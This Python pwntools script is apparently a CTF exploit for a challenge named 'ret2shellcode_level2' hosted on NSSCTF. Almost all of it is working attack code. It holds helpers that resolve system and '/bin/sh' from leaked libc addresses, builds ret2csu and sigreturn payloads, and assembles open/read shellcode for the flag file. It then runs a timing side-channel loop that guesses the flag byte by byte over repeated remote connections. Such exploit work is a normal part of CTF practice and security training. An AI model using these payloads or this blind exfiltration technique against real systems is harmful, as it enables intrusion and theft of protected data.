from pwn import *
from LibcSearcher import *
from ae64 import AE64
import time
import sys

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./bin/ret2shellcode_level2"
libc_addr = "../../Libcs/libc.so.6_3"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 0

ip, port = "61.147.171.105", 29609
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    # p = process(binary)
    dbg = lambda p: gdb.attach(p)
    libc_addr = "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(libc_addr)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    # p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
shell_open = """
mov al,2;
mov edi,0x404160;
xor rsi,rsi;
xor rdx,rdx;
syscall;
"""
shell_read = """
xor rax,rax;
mov di,0x3;
mov esi,0x404550;
mov dx,0x50;
syscall;
"""

shell_open = shellcraft.open("./flag")
shell_read = shellcraft.read(0x3, 0x404500, 0x50)
shell_judge = """
xor eax,eax;
xor edi,edi;
mov rsi,rsp;
push 0x50;
pop rdx
syscall;
xor edx,edx;
xor ebx,ebx;
mov esi, 0x1010101;
xor esi, 0x1414401;
LOOP:
inc dx;
mov al,byte ptr [rsp + rdx];
mov bl,byte ptr [esi + edx];
cmp ax,bx;
je LOOP;
"""
"""
NOP:
inc ax;
jmp NOP;


# dbg(p)
payload = asm(shell_open) + asm(shell_read) + asm(shell_judge)

assert len(payload) <= 0x100
payload = payload.ljust(0x100, b"a")
payload += b"/flag\x00\x00\x00"
payload += p64(0x404060)
p.send(payload)
ascii = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*{}"
"""
shell_open = shellcraft.open("./flag")
shell_read = shellcraft.read(0x3, 0x404500, 0x50)
shellcode1 = asm(shell_open)
shellcode2 = asm(shell_read)

flag = "nssctf{1d3_hc@nn3l_bl@st1ng_t0_g3t_fl4g}"
flag = "nssctf{S1d3_ch@nn3l_bl@st1ng_t0_g3t_fl4g}"
#       01234567890123456789012345678901234567890
end_flag = 0
for i in range(24, 25):
    byte = 125
    try:
        p = remote("node5.anna.nssctf.cn", 29609)
    except:
        log.success("\033[0;32mflag:{0}\033[0m".format(flag))
        sys.exit(0)
    # p = process(binary)
    shell_judge = """
    xor eax,eax;
    xor edi,edi;
    xor edx,edx;
    xor ebx,ebx;
    mov esi, 0x1010101;
    xor esi, 0x1414401;
    LOOP:
    mov al,{1};
    mov bl,byte ptr [esi + {0}];
    cmp ax,bx;
    je LOOP;
    """.format(
        i, byte
    )
    payload = shellcode1 + shellcode2 + asm(shell_judge)

    assert len(payload) <= 0x100
    payload = payload.ljust(0x100, b"a")
    payload += b"/flag\x00\x00\x00"
    payload += p64(0x404060)
    p.send(payload)

    start = time.time()
    try:
        # sh.recv()		# 收取垃圾数据
        p.recv(timeout=2)
    except:
        pass
    end = time.time()

    if end - start > 1.5:
        flag += chr(byte)
        log.success("\033[0;32mflag:{0}\033[0m".format(flag))
        p.close()
        sleep(3)
        break
    for byte in range(32, 127):
        try:
            p = remote("node5.anna.nssctf.cn", 29609)
        except:
            log.success("\033[0;32mflag:{0}\033[0m".format(flag))
            sys.exit(0)
        # p = process(binary)
        shell_judge = """
        xor eax,eax;
        xor edi,edi;
        xor edx,edx;
        xor ebx,ebx;
        mov esi, 0x1010101;
        xor esi, 0x1414401;
        LOOP:
        mov al,{1};
        mov bl,byte ptr [esi + {0}];
        cmp ax,bx;
        je LOOP;
        """.format(
            i, byte
        )
        payload = shellcode1 + shellcode2 + asm(shell_judge)

        assert len(payload) <= 0x100
        payload = payload.ljust(0x100, b"a")
        payload += b"/flag\x00\x00\x00"
        payload += p64(0x404060)
        p.send(payload)

        start = time.time()
        try:
            # sh.recv()		# 收取垃圾数据
            p.recv(timeout=2)
        except:
            pass
        end = time.time()

        if end - start > 1.5:
            flag += chr(byte)
            log.success("\033[0;32mflag:{0}\033[0m".format(flag))
            p.close()
            sleep(3)
            break
    log.success("\033[0;32mflag:{0}\033[0m".format(flag))
log.success("\033[0;32mflag:{0}\033[0m".format(flag))

# p.interactive()
